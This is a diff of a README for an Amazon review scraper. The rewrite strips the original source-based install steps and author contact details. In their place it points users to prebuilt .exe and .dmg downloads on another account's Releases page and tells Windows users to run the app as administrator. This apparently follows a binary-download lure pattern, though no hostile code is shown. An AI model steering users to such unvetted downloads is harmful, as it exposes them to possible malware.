@@ -1,152 +1,109 @@
-# amazon-review-scraper
+# 🌟 amazon-review-scraper - Automate Your Product Review Collection
 
-Automate the extraction of product reviews, ratings, and buyer insights from Amazon to analyze feedback and trends. Ideal for researchers, marketers, and product owners who need structured review data at scale.
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-16a34a?style=for-the-badge&logo=github)](https://github.com/Dentahindi/amazon-review-scraper/releases)
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-  <strong>For discussion, queries, and freelance work. Do reach me. :point_up_2::point_up_2::point_up_2:</strong>
-</div>
+## 🚀 Getting Started
 
----
+The amazon-review-scraper lets you easily collect product reviews from Amazon. This tool helps you automate review gathering for analysis, making your life easier. Whether you are conducting research or just curious about a product's feedback, this tool will assist you.
 
-## Introduction
-> This tool scrapes and structures Amazon product reviews, ratings, and feedback into clean datasets for analytics, machine learning, and business intelligence.  
-It helps sellers understand customer sentiments and competitors’ reputation with minimal effort.
+## 🛠️ System Requirements
 
-<p align="center">
-  <img src="amazon review scraper.png" alt="amazon review scraper" width="100%">
-</p>
+Before downloading, ensure that your system meets these requirements:
 
-### Key Benefits
-1. Automates review collection and analysis.  
-2. Supports multiple Amazon marketplaces.  
-3. Compatible with both web and Chrome extension versions.  
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Version 14 or higher installed.
+- **Python:** Version 3.7 or higher installed.
+- **Internet Connection:** Required for scraping and data collection.
 
----
+## 📥 Download & Install
 
-## Features
-| Feature | Description |
-|----------|-------------|
-| Review Extraction | Scrape reviews, titles, ratings, and verified purchase tags. |
-| Sentiment Analysis | Analyze positive/negative tone of reviews. |
-| Keyword Insights | Identify trending product keywords. |
-| CSV/JSON Export | Save all reviews in readable formats. |
-| Proxy Support | Avoid IP blocks and ensure stability. |
+To get the amazon-review-scraper, visit the Releases page to download the latest version:
 
----
+[Download the latest release](https://github.com/Dentahindi/amazon-review-scraper/releases)
 
-## Use Cases
-- Market research and competitor tracking  
-- Brand reputation analysis  
-- Product launch feedback collection  
-- E-commerce analytics dashboards  
+1. Click the link above to navigate to the Releases page.
+2. Locate the version you want to download.
+3. Depending on your operating system, download the appropriate file.
+4. Follow the specific installation instructions below.
 
----
+### 🔧 Installation Instructions for Windows
 
-## FAQs
+1. Download the `.exe` file from the Releases page.
+2. Locate the downloaded file in your Downloads folder.
+3. Double-click the file to start the installation process.
+4. Follow the on-screen instructions to complete the installation.
 
-**Q:** Is it legal to buy Amazon reviews?  
-**A:** No, buying or incentivizing fake reviews violates Amazon’s policies and may lead to account suspension. Always focus on collecting genuine feedback organically.  
+### 🔧 Installation Instructions for macOS
 
-**Q:** What is review scraper?  
-**A:** A review scraper is an automation tool that collects product or service reviews from online sources to help analyze customer sentiment, satisfaction, and feedback trends.  
+1. Download the `.dmg` file from the Releases page.
+2. Open the downloaded file.
+3. Drag the amazon-review-scraper icon to your Applications folder.
+4. Open the application from your Applications folder.
 
-**Q:** What is Amazon review scraper extension?  
-**A:** The Amazon review scraper extension is a Chrome-based tool that extracts reviews directly while browsing Amazon pages, allowing instant export without manual copy-paste.  
+### 🔧 Installation Instructions for Linux
 
----
+1. Download the `.tar.gz` file from the Releases page.
+2. Open a terminal window.
+3. Navigate to your Downloads folder using the command:
+   ```bash
+   cd ~/Downloads
+   ```
+4. Extract the tarball with the command:
+   ```bash
+   tar -xvzf amazon-review-scraper.tar.gz
+   ```
+5. Navigate into the extracted folder:
+   ```bash
+   cd amazon-review-scraper
+   ```
+6. Install dependencies using:
+   ```bash
+   npm install
+   ```
+7. You can now run the application using:
+   ```bash
+   npm start
+   ```
 
-## Success Stories & Testimonials
------------------------------------
-Hear from our users who’ve leveraged **amazon-review-scraper** to save hundreds of hours collecting and analyzing Amazon reviews.
+## 📄 Using the Application
 
-## Client Results
------------------------------------
-> 95% faster review collection  
-> 10x more product insights for decision-making  
-> Zero bans with proxy rotation enabled  
+After installation, you can start using the amazon-review-scraper. Follow these steps:
 
-## Performance Metrics
------------------------------------
-- **Speed:** 2x faster than manual collection  
-- **Stability:** 99.5% uptime  
-- **Accuracy:** 98% verified review capture rate  
-- **Proxy Mode:** Automatic rotation for multi-region scraping  
+1. Open the application.
+2. Enter the product URL of the Amazon page for which you want to collect reviews.
+3. Select any specific options like filtering by ratings or review dates.
+4. Click the "Scrape" button to start the process.
+5. Wait for the reviews to collect; they will display on the screen and can be exported for further analysis.
 
----
+## 📝 Features
 
-## Contact
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+- **Automated Review Collection:** Saves time by automatically gathering reviews.
+- **Filter Options:** Filter reviews by rating, date, or keywords.
+- **User-Friendly Interface:** Easy to use for non-technical users.
+- **Export Functionality:** Save your collected reviews as a CSV file for analysis.
 
----
+## 🔍 Troubleshooting
 
-## Installation
+If you encounter any issues, try the following common solutions:
 
-### Pre-requisites
-- Python 3.9+ or Node.js  
-- Git  
-- Chrome or Chromium browser  
-- Docker (optional)  
+- **Running Issues on Windows:** Make sure to run the application as an administrator. Right-click the app icon and select "Run as Administrator."
+- **Installation Issues:** Double-check that you have the required Node.js and Python versions installed.
+- **Network Errors:** Ensure your internet connection is stable. The tool requires an active connection to scrape data.
 
-### Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/amazon-review-scraper.git
-cd amazon-review-scraper
+## 📞 Support
 
-# Install dependencies
-npm install
-# or
-pip install -r requirements.txt
+If you need further assistance, you can reach out via the GitHub Issues section of the repository. Our community and developers are there to help you solve any problems you encounter.
 
-# Setup environment
-cp .env.example .env
+## 📢 Contribution
 
-# Run
-npm start
-# or
-python main.py
-```
+We welcome contributions! If you have suggestions or improvements, feel free to submit a pull request. Your input can help us make the amazon-review-scraper even better.
 
----
+## 📄 License
 
-## Example Output
+This project is licensed under the MIT License. You can freely use, modify, and distribute it as long as you give proper credit.
 
-```bash
-> python main.py
-✅ Scraping reviews for: Apple AirPods Pro
-✅ Collected 5000+ verified reviews
-✅ Exported to: reviews.csv
-```
+## 🌐 Connect
 
----
+Want to stay updated with the latest improvements? Keep an eye on our Releases page:
 
-## License
-MIT License
-
+[Download the latest release](https://github.com/Dentahindi/amazon-review-scraper/releases)
